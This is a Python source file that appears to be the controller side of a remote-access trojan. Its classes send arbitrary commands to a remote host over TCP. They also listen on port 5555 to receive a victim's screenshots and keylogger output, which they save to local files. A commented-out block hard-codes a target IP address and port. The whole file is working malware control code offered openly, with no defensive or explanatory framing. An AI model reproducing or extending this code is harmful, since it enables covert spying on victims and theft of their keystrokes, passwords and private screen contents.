import socket
import netifaces as ni
from PIL import Image


def get_my_ip() -> str:
    ip = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
    return ip


# target_host = '192.168.31.137'
# target_port = 5555
#
# def main():
#     client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#
#     client.connect((target_host, target_port))
#     client.send(b"")
#
#     client.close()
# if __name__ == '__main__':
#     main()

class Exploitable:
    def __init__(self, host, port):
        self.host = host
        self.port = port

    def execute(self, command):
        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.client.connect((self.host, self.port))
        self.client.send(bytes(command, 'utf-8'))
        self.client.close()


class Screenshooter:
    def __init__(self, host, port):
        self.host = host
        self.port = port

    def take_skreenshot(self, command, ip):
        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.client.connect((self.host, self.port))
        self.client.send(bytes(command, 'utf-8'))
        self.client.close()
        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.client.bind((ip, 5555))
        self.client.listen()
        self.client_sock, self.client_port = self.client.accept()
        file = open(file=f'screen_shot_{self.host}.png', mode='wb')
        data = self.client_sock.recv(2048)
        while (data):
            file.write(data)
            data = self.client_sock.recv(2048)
        file.close()
        img = Image.open(f'screen_shot_{self.host}.png')
        img.show()


class Keylogger:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.c = True

    def get_keylog(self, ip):
        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.client.bind((ip, 5555))
        self.client.listen()
        self.client_sock, self.client_port = self.client.accept()
        file = open(file=f'keylog_{self.host}.txt', mode='w')
        data = bytes.decode(self.client_sock.recv(2048), 'utf-8')
        while (data):
            file.write(data)
            data = bytes.decode(self.client_sock.recv(2048), 'utf-8')
        file.close()


